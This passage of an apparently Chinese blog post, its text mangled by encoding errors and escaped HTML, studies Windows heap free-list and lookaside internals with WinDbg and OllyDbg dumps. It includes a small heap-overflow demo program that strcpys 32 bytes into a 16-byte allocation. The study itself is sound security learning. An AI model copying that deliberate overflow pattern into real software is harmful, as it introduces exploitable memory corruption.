    free[2]å¤„çš„003a0688(free[2]çš„ç¬¬ä¸€ä¸ªç©ºé—²å †å—çš„ç´¢å¼•)å¯¹åº”çš„å†…å­˜å€¼[003a0688]=h3=003a06a8,è€Œ
    [003a0688+4]=free[2]=3a0188,è€Œ[003a06a8]=free[2]=003a0188,[003a06a8+4]=003a0688,free[2]ä¸º3a0188,h3é‡Šæ”¾å
    [3a0188]=3a0688,[3a0188+4]=3a06a8

    å®é™…ç¡®å®å¦‚æ­¤,å®é™…æ•°æ®å¦‚ä¸‹:

    003A0680  02 00 08 00 AA 00 0D 00 A8 06 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  02 00 02 00 AE 00 0A 00 88 01 3A 00 88 06 3A 00  ..?..?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 A8 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    å¦‚ä¸‹å›¾:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f8
f8
...
(eip=401078)
    åˆ°è¿™é‡Œh5é‡Šæ”¾å®Œ,ç”±äºh5å®é™…åˆ†é…å¤§å°ä¸º4ä¸ªå †å—å•å…ƒå¤§å°,h5å †å—é‡Šæ”¾åå°†é“¾å…¥free[4]ç©ºè¡¨ä¸­,free[4]=3a0198
    å¯ä»¥é¢„æµ‹:
    [3a0198]=h5=003a06c8,[3a0198+4]=h5=003a06c8
    [003a06c8]=3a0198,[003a06c8+4]=3a0198
    
    å®é™…æ•°æ®å¦‚ä¸‹:

    003A0190  90 01 3A 00 90 01 3A 00 C8 06 3A 00 C8 06 3A 00  ?:.?:.?:.?:.

    003A06C0  04 00 02 00 A2 00 0D 00 98 01 3A 00 98 01 3A 00  ..?..?:.?:.
    ä¸é¢„æµ‹ç»“æœä¸€è‡´

f8
f8
...
(eip=401082)
    åˆ°è¿™é‡Œh4é‡Šæ”¾å®Œ,ç”±äºh4å®é™…åˆ†é…å¤§å°ä¸º2ä¸ªå †å—å•å…ƒå¤§å°,h4å †å—é‡Šæ”¾åå°†é“¾å…¥free[2]ç©ºè¡¨ä¸­,free[2]=3a0188
    å¯ä»¥é¢„æµ‹:
    [free[2]]=[3a0188]=h1=3a0688,[3a0188+4]=h4=3a06b8
    [h1]=[3a0688]=h3=3a06a8,[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=h4=3a06b8,[3a06a8+4]=h1=3a0688
    [h4]=[3a06b8]=3a0188,[3a06b8+4]=h3=3a06a8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A06B0  02 00 02 00 AC 01 08 00 00 00 00 00 00 00 00 00  ..?.........

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    ä¸å®é™…æ•°æ®å¹¶ä¸ä¸€è‡´,å› ä¸ºh4é‡Šæ”¾å®Œå,h3,h4,h5ä¸‰ä¸ªç©ºé—²å †å—ç›¸é‚»,ä¼šå‘ç”Ÿåˆå¹¶,3ä¸ªå †å—å¤§å°ä¸€å…±ä¸º2+2+4=8ä¸ªå †å•å…ƒå¤§å°,
    åˆå¹¶åå°†é“¾å…¥free[8]ç©ºè¡¨ä¸­(free[8]æ˜¯128ä¸ªç©ºè¡¨ä¸­çš„ç¬¬9ä¸ªç©ºè¡¨çš„ç´¢å¼•,ä¹Ÿå³0x3a0000+0x178+8*8=0x3a01b8)
    ,é¢„æµ‹:
    [free[8]]=[3a01b8]=h3=3a06a8(h3,h4,h5åˆå¹¶åç”±h3ç´¢å¼•)
    [free[2]]=[3a0188]=h1=3a0688(2ä¸ªå †å—å•å…ƒå¤§å°çš„ç©ºé—²å †åªå‰©ä¸‹h1,åŸæ¥æ˜¯h1,h3,h4)
    [h1]=[3a0688]=free[2]=3a0188,[h1+4]=[3a0688+4]=free[2]=3a0188
    [h3]=[3a06a8]=free[8]=3a01b8,[h3+4]=[3a06a8+4]=free[8]=3a01b8

    å®é™…æ•°æ®å¦‚ä¸‹:

    003A01B0  B0 01 3A 00 B0 01 3A 00 A8 06 3A 00 A8 06 3A 00  ?:.?:.?:.?:.

    003A0180  80 01 3A 00 80 01 3A 00 88 06 3A 00 88 06 3A 00  â‚¬:.â‚¬:.?:.?:.

    003A0680  02 00 08 00 AA 00 0D 00 88 01 3A 00 88 01 3A 00  ..?..?:.?:.

    003A06A0  08 00 02 00 AE 00 0A 00 B8 01 3A 00 B8 01 3A 00  ..?..?:.?:.

    å¯è§,å®é™…æ•°æ®ä¸é¢„æµ‹ç»“æœå®Œå…¨ä¸€æ ·,æ­¤æ—¶[free[0]]=[0x3a0178]=3a0708(ä¸€ç›´ä¸å˜),3a0708å¤„æ•°æ®å¦‚ä¸‹:
    003A0700  20 01 04 00 00 10 00 00 78 01 3A 00 78 01 3A 00   ....x:.x:.
    å¯è§å½“å‰å †å—å¤§å°ä¸º0x120(ä¸ªå †å—å•å…ƒå¤§å°),ä¸Šä¸€ä¸ªå †å—å¤§å°ä¸º4?
    å¹¶ä¸æ˜¯è¿™æ ·,å› ä¸º0x178åç§»å¤„å¹¶ä¸æ˜¯å †å—,è€Œæ˜¯å¤§å°ä¸º128çš„æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæ•°ç»„çš„ä½ç½®,æ‰€ä»¥0x178-8å¹¶ä¸æ˜¯å—é¦–
    ,åç§»0x178æ˜¯free[0],ä¹Ÿå³free[0]=0x3a0178,è€Œåç§»0x178ä¸­å­˜æ”¾çš„å†…å®¹ä¹Ÿå³[free[0]]ä¸ºè¿™ä¸ªæŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
    çš„å€¼,è¿™ä¸ªå€¼æ˜¯ä¸ªæŒ‡é’ˆ,æŒ‡å‘free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—,æ­¤ä¾‹ä¸­free[0]ç©ºè¡¨åªæœ‰ä¸€ä¸ªå †å—,å †å—çš„ç´¢å¼•ä¸º3a0708,ä¹Ÿå³:
    [free[0]]=[3a0178]=3a0708,ä¸”[free[0]+4]=[3a0178+4]=3a0708
    è€Œ[3a0708]=[3a0708+4]=3a0178

ä½¿ç”¨å †çš„ä¸‰ç§æ–¹æ³•:
    a&amp;gt;GetProcessHeapè·å¾—è¿›ç¨‹é»˜è®¤å †å¥æŸ„,HeapAlloc(è¿›ç¨‹é»˜è®¤å¥æŸ„)å¯ä»¥ä»é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´
    b&amp;gt;å½¢å¦‚HeapCreate(0,0x1000,0x10000)åˆ›å»ºä¸å¯æ‰©å±•å †,å †å°†å¯ç”¨ç©ºè¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´
    c&amp;gt;å½¢å¦‚HeapCreate(0,0,0)åˆ›å»ºå¯æ‰©å±•å †,å †å°†å¯ç”¨å¿«è¡¨,HeapAllocä»å †ä¸Šåˆ†é…ç©ºé—´

    åœ¨æ­¤ä¾‹ä¸­,ç”±äºåœ¨åˆ›å»ºå †æ—¶ä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0x1000,0x10000),å¦‚æœä½¿ç”¨çš„æ–¹æ³•æ˜¯HeapCreate(0,0,0)å°†åˆ›å»ºå¯
    æ‰©å±•çš„å †,è¿™æ—¶å †ä¼šå¯ç”¨å¿«è¡¨,æŒ‡å‘å¿«è¡¨çš„æŒ‡é’ˆä½äºå †åç§»??å­—èŠ‚å¤„,0day2ä¹¦ä¸­åŒæ—¶æŒ‡å‡ºå¿«è¡¨ä½äº0x584å’Œ0x688åç§»å¤„,é€š
    è¿‡ä¸‹é¢ä»£ç çš„è°ƒè¯•æŸ¥çœ‹å¿«è¡¨çš„åç§»åœ¨å“ªé‡Œ:

    -----------find-lookaside---------------
    #include &amp;lt;windows.h&amp;gt;
    int main()
    {
    	HANDLE hp;
    	HLOCAL h1,h2,h3;
    	hp=HeapCreate(0,0,0);
    	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
    	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
    	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
    	getchar();
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    	HeapFree(hp,0,h1);
    
    	return 0;
    
    }
    ------------------end-------------------
    ç¼–è¯‘æˆreleaseç‰ˆæœ¬å,è¿è¡Œexe,windbgåŠ è½½
    dt _PEB @$pebæŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå—ä¿¡æ¯

    0:001&amp;gt; dt _PEB @$peb
    ntdll!_PEB
       +0x000 InheritedAddressSpace : 0 &#39;&#39;
       +0x001 ReadImageFileExecOptions : 0 &#39;&#39;
       +0x002 BeingDebugged    : 0x1 &#39;&#39;
       +0x003 SpareBool        : 0 &#39;&#39;
       +0x004 Mutant           : 0xffffffff 
       +0x008 ImageBaseAddress : 0x00400000 
       +0x00c Ldr              : 0x00241e90 _PEB_LDR_DATA
       +0x010 ProcessParameters : 0x00020000 _RTL_USER_PROCESS_PARAMETERS
       +0x014 SubSystemData    : (null) 
       +0x018 ProcessHeap      : 0x00140000     ===&amp;gt;è¿›ç¨‹å¯åŠ¨åˆ›å»ºçš„é»˜è®¤å †
       +0x01c FastPebLock      : 0x7c99d600 _RTL_CRITICAL_SECTION
       +0x020 FastPebLockRoutine : 0x7c921000 
       +0x024 FastPebUnlockRoutine : 0x7c9210e0 
       +0x028 EnvironmentUpdateCount : 1
       +0x02c KernelCallbackTable : (null) 
       +0x030 SystemReserved   : [1] 0
       +0x034 AtlThunkSListPtr32 : 0
       +0x038 FreeList         : (null) 
       +0x03c TlsExpansionCounter : 0
       +0x040 TlsBitmap        : 0x7c99d5c0 
       +0x044 TlsBitmapBits    : [2] 1
       +0x04c ReadOnlySharedMemoryBase : 0x7f6f0000 
       +0x050 ReadOnlySharedMemoryHeap : 0x7f6f0000 
       +0x054 ReadOnlyStaticServerData : 0x7f6f0688  -&amp;gt; (null) 
       +0x058 AnsiCodePageData : 0x7ffa0000 
       +0x05c OemCodePageData  : 0x7ffa0000 
       +0x060 UnicodeCaseTableData : 0x7ffd1000 
       +0x064 NumberOfProcessors : 1
       +0x068 NtGlobalFlag     : 0
       +0x070 CriticalSectionTimeout : _LARGE_INTEGER 0xffffe86d`079b8000
       +0x078 HeapSegmentReserve : 0x100000
       +0x07c HeapSegmentCommit : 0x2000
       +0x080 HeapDeCommitTotalFreeThreshold : 0x10000
       +0x084 HeapDeCommitFreeBlockThreshold : 0x1000
       +0x088 NumberOfHeaps    : 5            ===&amp;gt;è¿›ç¨‹ä¸­å…±æœ‰5ä¸ªå †
       +0x08c MaximumNumberOfHeaps : 0x10
       +0x090 ProcessHeaps     : 0x7c99cfc0  -&amp;gt; 0x00140000    ===&amp;gt;è¿›ç¨‹å †æŒ‡é’ˆæ•°æ®
       +0x094 GdiSharedHandleTable : (null) 
       +0x098 ProcessStarterHelper : (null) 
       +0x09c GdiDCAttributeList : 0
       +0x0a0 LoaderLock       : 0x7c99b178 
       +0x0a4 OSMajorVersion   : 5
       +0x0a8 OSMinorVersion   : 1
       +0x0ac OSBuildNumber    : 0xa28
       +0x0ae OSCSDVersion     : 0x300
       +0x0b0 OSPlatformId     : 2
       +0x0b4 ImageSubsystem   : 3
       +0x0b8 ImageSubsystemMajorVersion : 4
       +0x0bc ImageSubsystemMinorVersion : 0
       +0x0c0 ImageProcessAffinityMask : 0
       +0x0c4 GdiHandleBuffer  : [34] 0
       +0x14c PostProcessInitRoutine : (null) 
       +0x150 TlsExpansionBitmap : 0x7c99d5b8 
       +0x154 TlsExpansionBitmapBits : [32] 0
       +0x1d4 SessionId        : 0
       +0x1d8 AppCompatFlags   : _ULARGE_INTEGER 0x0
       +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER 0x0
       +0x1e8 pShimData        : (null) 
       +0x1ec AppCompatInfo    : (null) 
       +0x1f0 CSDVersion       : _UNICODE_STRING &quot;Service Pack 3&quot;
       +0x1f8 ActivationContextData : (null) 
       +0x1fc ProcessAssemblyStorageMap : (null) 
       +0x200 SystemDefaultActivationContextData : 0x00130000 
       +0x204 SystemAssemblyStorageMap : (null) 
       +0x208 MinimumStackCommit : 0

    +0x018å’Œ+0x088å¤„åˆ†åˆ«ä¸ºè¿›ç¨‹é»˜è®¤å †å’Œè¿›ç¨‹ä¸­å †çš„ä¸ªæ•°
    +0x090å¤„ä¸ºè¿›ç¨‹ä¸­æ‰€æœ‰å †çš„åœ°å€ç»„æˆçš„æŒ‡é’ˆæ•°ç»„

    dd 0x7c99cfc0æŸ¥çœ‹è¿›ç¨‹å †æ•°ç»„
    0:001&amp;gt; dd 0x7c99cfc0
    7c99cfc0  00140000 00240000 00250000 00380000
    7c99cfd0  003a0000 00000000 00000000 00000000
    7c99cfe0  00000000 00000000 00000000 00000000
    7c99cff0  00000000 00000000 00000000 00000000

    æˆ–è€…!heap -hæŸ¥çœ‹æ‰€æœ‰å †çš„åœ°å€
    0:001&amp;gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00140000 
        Segment at 00140000 to 00240000 (00004000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00006000 bytes committed)
      3:   00250000 
        Segment at 00250000 to 00260000 (00003000 bytes committed)
      4:   00380000 
        Segment at 00380000 to 00390000 (00002000 bytes committed)
      5:   003a0000 
        Segment at 003a0000 to 003e0000 (00003000 bytes committed)

    ä¸¤ç§æ–¹æ³•å¾—åˆ°çš„ç»“æœä¸€æ ·,å…¶ä¸­æœ€åä¸€ä¸ªå †çš„åœ°å€0x003a0000æ˜¯ä»£ç ä¸­HeapCreate(0,0,0)åˆ›å»ºå¾—åˆ°çš„å †åœ°å€

    dt _HEAP 0x3a0000æŸ¥çœ‹è¿™ä¸ªå †çš„ç»“æ„
    0:001&amp;gt; dt _HEAP 0x3a0000
    ntdll!_HEAP
       +0x000 Entry            : _HEAP_ENTRY
       +0x008 Signature        : 0xeeffeeff
       +0x00c Flags            : 0x1002
       +0x010 ForceFlags       : 0
       +0x014 VirtualMemoryThreshold : 0xfe00
       +0x018 SegmentReserve   : 0x100000
       +0x01c SegmentCommit    : 0x2000
       +0x020 DeCommitFreeBlockThreshold : 0x200
       +0x024 DeCommitTotalFreeThreshold : 0x2000
       +0x028 TotalFreeSize    : 0x229
       +0x02c MaximumAllocationSize : 0x7ffdefff
       +0x030 ProcessHeapsListIndex : 5
       +0x032 HeaderValidateLength : 0x608
       +0x034 HeaderValidateCopy : (null) 
       +0x038 NextAvailableTagIndex : 0
       +0x03a MaximumTagIndex  : 0
       +0x03c TagEntries       : (null) 
       +0x040 UCRSegments      : (null) 
       +0x044 UnusedUnCommittedRanges : 0x003a0598 _HEAP_UNCOMMMTTED_RANGE
       +0x048 AlignRound       : 0xf
       +0x04c AlignMask        : 0xfffffff8
       +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x3a0050 - 0x3a0050 ]
       +0x058 Segments         : [64] 0x003a0640 _HEAP_SEGMENT
       +0x158 u                : __unnamed
       +0x168 u2               : __unnamed
       +0x16a AllocatorBackTraceIndex : 0
       +0x16c NonDedicatedListLength : 1
       +0x170 LargeBlocksIndex : (null) 
       +0x174 PseudoTagEntries : (null) 
       +0x178 FreeLists        : [128] _LIST_ENTRY [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x578 LockVariable     : 0x003a0608 _HEAP_LOCK
       +0x57c CommitRoutine    : (null) 
       +0x580 FrontEndHeap     : 0x003a0688 
       +0x584 FrontHeapLockCount : 0
       +0x586 FrontEndHeapType : 0x1 &#39;&#39;
       +0x587 LastSegmentIndex : 0 &#39;&#39;

    å¯ä»¥åœ¨0x178åç§»å¤„æ‰¾åˆ°free[0](0å·ç©ºè¡¨)

    dt _LIST_ENTRY 0x3a0178
    ntdll!_LIST_ENTRY
     [ 0x3a1ec0 - 0x3a1ec0 ]
       +0x000 Flink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]
       +0x004 Blink            : 0x003a1ec0 _LIST_ENTRY [ 0x3a0178 - 0x3a0178 ]

    dd 0x3a0688
    0:001&amp;gt; dd 0x3a0688
    003a0688  00000000 00000000 01000004 00000000
    003a0698  00000000 00000000 00000000 00000000
    003a06a8  00000000 00000003 00000000 00000000
    003a06b8  00000000 00000000 01000004 00000000

    0x3a0000å †ä¸­èƒ½æ‰¾åˆ°0å·ç©ºè¡¨ä½†æ˜¯å´æ‰¾ä¸åˆ°å¿«è¡¨,0day2ä¸­è¯´çš„0x688å’Œ0x584åç§»å¤„å¹¶ä¸æ˜¯å¿«è¡¨çš„æ‰€åœ¨,å…³äºå¿«è¡¨çš„æ‰€åœ¨å’Œå‡º
    ç°æ¡ä»¶,æš‚æƒ‘ä¸å¾—è§£
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;2&amp;gt;æ¼æ´æˆ˜äº‰å®ä¾‹&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ç³»ç»Ÿ:win7 x64+vc6.0

------------------heapoverflow.c---------------------
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
    HANDLE hHeap;
    char *heap;
    char str[]=&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    hHeap=HeapCreate(HEAP_GENERATE_EXCEPTIONS,0x1000,0xffff);
    getchar();

    heap=HeapAlloc(hHeap,0,0x10);
    printf(&quot;heap addr:0x%08x\n&quot;,heap);

    strcpy(heap,str);
    HeapFree(hHeap,0,heap);

    HeapDestroy(hHeap);
    return 0;
}
------------------------end--------------------------

ç¼–è¯‘æˆreleaseç‰ˆæœ¬,ç”Ÿæˆäº†heapoverflow.exe,åŒå‡»exe,odé™„åŠ 
alt+e
    é€‰æ‹©å¯¹åº”exe,call getcharä¸‹é¢ä¸€å¥å¯¹åº”å¦‚ä¸‹æ±‡ç¼–ä»£ç 
    0040104b  |.  83c404        add     esp,4
    0040104B  |.  83C4 04       add esp,0x4
    0040104E  |&amp;gt;  6A 10         push 0x10                                ; /dwBytes = 10 (16.)
    00401050  |.  6A 00         push 0x0                                 ; |dwFlags = 0
    00401052  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401053  |.  FF15 08604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapAlloc&amp;gt;&amp;gt;; \RtlAllocateHeap
    00401059  |.  8BD8          mov ebx,eax
    0040105B  |.  53            push ebx
    0040105C  |.  68 30704000   push heapover.00407030                   ;  ASCII &quot;heap addr:0x%08x
    &quot;
    00401061  |.  E8 4A000000   call heapover.004010B0
    00401066  |.  8D7C24 18     lea edi,dword ptr ss:[esp+0x18]
    0040106A  |.  83C9 FF       or ecx,-0x1
    0040106D  |.  33C0          xor eax,eax
    0040106F  |.  83C4 08       add esp,0x8
    00401072  |.  F2:AE         repne scas byte ptr es:[edi]
    00401074  |.  F7D1          not ecx                                  ;  heapover.00409E41
    00401076  |.  2BF9          sub edi,ecx                              ;  heapover.00409E41
    00401078  |.  53            push ebx                                 ; /pMemory = 7FFDD000
    00401079  |.  8BC1          mov eax,ecx                              ; |heapover.00409E41
    0040107B  |.  8BF7          mov esi,edi                              ; |
    0040107D  |.  8BFB          mov edi,ebx                              ; |
    0040107F  |.  6A 00         push 0x0                                 ; |Flags = 0
    00401081  |.  C1E9 02       shr ecx,0x2                              ; |
    00401084  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&amp;gt;; |
    00401086  |.  8BC8          mov ecx,eax                              ; |
    00401088  |.  55            push ebp                                 ; |hHeap = 003A0000
    00401089  |.  83E1 03       and ecx,0x3                              ; |
    0040108C  |.  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[&amp;gt;; |
    0040108E  |.  FF15 04604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapFree&amp;gt;] ; \HeapFree
    00401094  |.  55            push ebp                                 ; /hHeap = 003A0000
    00401095  |.  FF15 00604000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.HeapDestro&amp;gt;; \HeapDestroy
    0040109B  |.  5F            pop edi                                  ;  heapover.00407068
    0040109C  |.  5E            pop esi                                  ;  heapover.00407068
    0040109D  |.  5D            pop ebp                                  ;  heapover.00407068
    0040109E  |.  33C0          xor eax,eax
    004010A0  |.  5B            pop ebx                                  ;  heapover.00407068
    004010A1  |.  83C4 24       add esp,0x24
    004010A4  \.  C3            retn

é€€å‡ºod
é‡æ–°è¿è¡Œheapoverflow.exe,windbgé™„åŠ 
bp 0x40104b
g
åœ¨exeä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦
windbgä¸­æ–­åœ¨æ–­ç‚¹å¤„:
    Breakpoint 0 hit
    eax=00000031 ebx=7efde000 ecx=00409e41 edx=00000101 esi=00407065 edi=0018ff49
    eip=0040104b esp=0018ff14 ebp=00870000 iopl=0         nv up ei pl nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    heapoverflow+0x104b:
    0040104b 83c404          add     esp,4
t
t
...
(eip=401053)
    æ­¤æ—¶è¿˜æ²¡æ‰§è¡ŒHeapAlloc(hHeap,0,0x10)
!heap -h
    0:000&amp;gt; !heap -h
    Index   Address  Name      Debugging options enabled
      1:   00590000 
        Segment at 00590000 to 00690000 (00007000 bytes committed)
      2:   00240000 
        Segment at 00240000 to 00250000 (00002000 bytes committed)
      3:   00870000 
        Segment at 00870000 to 00880000 (00001000 bytes committed)

dt _HEAP 870000
    +0x0c4 FreeLists        : _LIST_ENTRY [ 0x870590 - 0x870590 ] ==&amp;gt;è¯´æ˜0x870590å¤„æ˜¯free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—
    æ­¤æ—¶free[0]ç©ºè¡¨åç§»ä¸å†æ˜¯0x178å¤„,è€Œæ˜¯0x0c4å¤„
dt _LIST_ENTRY 8700c4
    0:000&amp;gt; dt _LIST_ENTRY 870590
    ntdll!_LIST_ENTRY
     [ 0x8700c4 - 0x8700c4 ]
       +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]
       +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]

t
    æ­¤æ—¶è¿›å…¥äº†HeapAllocå‡½æ•°å†…éƒ¨
shift+f11
    æ‰§è¡Œåˆ°è·³å‡ºHeapAllocå‡½æ•°(ç³»ç»Ÿé¢†åŸŸ)åˆ°å½“ä¸Šä¸€å±‚å‡½æ•°
(eip=401059)
    æ­¤æ—¶å †åˆ†é…å®Œæˆ
    dt _heap 870000
        +0x0c4 FreeLists        : _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    è¿™ä¸ªç»“æœè¡¨æ˜free[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å¿«ä¸å†æ˜¯åŸæ¥çš„0x870590,è€Œå˜æˆäº†0x8705a8
    dt _LIST_ENTRY 8705a8
        0:000&amp;gt; dt _LIST_ENTRY 8705a8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
    æŸ¥çœ‹å¯„å­˜å™¨ä¹Ÿå¯ä»¥çœ‹åˆ°eax=870590(åŸæ¥çš„free[0]ç©ºè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•å€¼),ä¹Ÿå³æºä»£ç ä¸­çš„heap=HeapAlloc(hHeap,0,0x10)
    åˆ†é…åˆ°çš„å †çš„ç´¢å¼•ä¸º870590,é‚£ä¹ˆheap_entryç»“æ„åœ¨870590-8=870588å¤„
    dt _HEAP_ENTRY 870590
        0:000&amp;gt; dt _heap_entry 870590
        ntdll!_HEAP_ENTRY
           +0x000 Size             : 0xc4
           +0x002 Flags            : 0x87 &#39;&#39;
           +0x003 SmallTagIndex    : 0 &#39;&#39;
           +0x000 SubSegmentCode   : 0x008700c4 
           +0x004 PreviousSize     : 0xc4
           +0x006 SegmentOffset    : 0x87 &#39;&#39;
           +0x006 LFHFlags         : 0x87 &#39;&#39;
           +0x007 UnusedBytes      : 0 &#39;&#39;
           +0x000 FunctionIndex    : 0xc4
           +0x002 ContextValue     : 0x87
           +0x000 InterceptorValue : 0x8700c4
           +0x004 UnusedBytesLength : 0xc4
           +0x006 EntryOffset      : 0x87 &#39;&#39;
           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
           +0x000 Code1            : 0x8700c4
           +0x004 Code2            : 0xc4
           +0x006 Code3            : 0x87 &#39;&#39;
           +0x007 Code4            : 0 &#39;&#39;
           +0x000 AgregateCode     : 0x8700c4`008700c4
    å‘ç°å‰ä¸¤ä¸ªå­—èŠ‚å¹¶ä¸æ˜¯3(HeapAllocåˆ†é…0x10+8=3*8å…±3ä¸ªå †å•å…ƒå¤§å°çš„ç©ºé—´),å¯¹ç…§æ³‰å“¥ä¹¦ä¸­çš„å‘½ä»¤,å‘ç°æŸ¥çœ‹å‘½ä»¤åº”è¯¥æ˜¯
    !heap -p -a 870588,è€Œä¸æ˜¯æˆ‘è®¤ä¸ºçš„dt _heap_entry 870590,åæ¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°åŒæ ·çš„é—®é¢˜,è¯´æ˜¯&quot;nt6ä»¥å,heapç»“æ„
    å˜å¾—ä¸å°,dt heap_entryæ˜¯æ— æ³•çœ‹åˆ°çš„,è²Œä¼¼heap_entryåšäº†ç¼–ç &quot;
        http://www.cppblog.com/ay19880703/archive/2011/10/30/159364.html
    äºæ˜¯ç”¨ä¹¦ä¸­çš„!heap -p -a 870588æŸ¥çœ‹heap_entryç»“æ„
    !heap -p -a 870588
        0:000&amp;gt; !heap -p -a 870588
            address 00870588 found in
            _HEAP @ 870000
              HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
                00870588 0003 0000  [00]   00870590    00010 - (busy)
    èƒ½å¤Ÿæ­£å¸¸æŸ¥çœ‹heap_entryçš„ä¿¡æ¯,å½“å‰å †å—å¤§å°ä¸º3,ä¸Šä¸€å †å—å¤§å°ä¸º0
    !heap
        0:000&amp;gt; !heap
        Index   Address  Name      Debugging options enabled
          1:   00590000                
          2:   00240000                
          3:   00870000 
    !heap -a 870000
        Heap entries for Segment00 in Heap 00870000
            00870000: 00000 . 00588 [101] - busy (587)
            00870588: 00588 . 00018 [101] - busy (10)
            008705a0: 00018 . 00a40 [100]
            00870fe0: 00a40 . 00020 [111] - busy (1d)
            00871000:      0000f000      - uncommitted bytes.
    ä»è¿™é‡Œçœ‹å‡ºheapå †çš„åœ°å€ä¸º870588,è€Œä¸æ˜¯870590,è¿™ä¸0day2ä¸­å †å—çš„ç´¢å¼•ä¸ºheap_entry(å ç”¨æ€)æˆ–è€…heap_free_entry
    (ç©ºé—²å †å—)çš„åœ°å€æœ‰ç‚¹ä¸åŒ,è¿™é‡Œçš„!heap -a 870000å¾—åˆ°çš„&quot;entries&quot;å¦‚æœç†è§£æˆ&quot;ç´¢å¼•&quot;ä¼šæŒ‡å‘heap_entry-8æˆ–è€…æ˜¯
    heap_free_entry-8çš„å †å—å—é¦–å¤„,è¿™é‡Œçš„entriesæŒ‰&quot;å…¥å£&quot;æ¥ç†è§£æ¯”è¾ƒå¥½,ä»ä¸Šé¢ä¹Ÿå¯çœ‹å‡º870588ä¸‹ä¸€ä¸ªå †å—æ˜¯ä¸ªç©ºé—²å †å—,
    è€Œä¸”è¿™ä¸ªç©ºé—²å †å—çš„å…¥å£æ˜¯8705a0(ä¸ä¸Šé¢çš„HeapAllocåˆ†é…åfree[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•ä¸º8705a8æ­£å¥½å¯¹åº”)
    ä¸ä¸Šé¢çš„dt _heap_entryä¸€æ ·çš„æ˜¯dt _heap_free_entryä¹Ÿä¸èƒ½å¾—åˆ°æƒ³è¦çš„æ•°æ®ä¸‹,å¦‚ä¸‹:
    dt _heap_free_entry 8705a0
        0:000&amp;gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x38a0
           +0x002 Flags            : 0x39 &#39;9&#39;
           +0x003 SmallTagIndex    : 0x1e &#39;&#39;
           +0x000 SubSegmentCode   : 0x1e3938a0 
           +0x004 PreviousSize     : 0x81cd    =====&amp;gt;è¿™é‡Œåº”è¯¥æ˜¯3
           +0x006 SegmentOffset    : 0 &#39;&#39;
           +0x006 LFHFlags         : 0 &#39;&#39;
           +0x007 UnusedBytes      : 0 &#39;&#39;
           +0x000 FunctionIndex    : 0x38a0
           +0x002 ContextValue     : 0x1e39
           +0x000 InterceptorValue : 0x1e3938a0
           +0x004 UnusedBytesLength : 0x81cd
           +0x006 EntryOffset      : 0 &#39;&#39;
           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
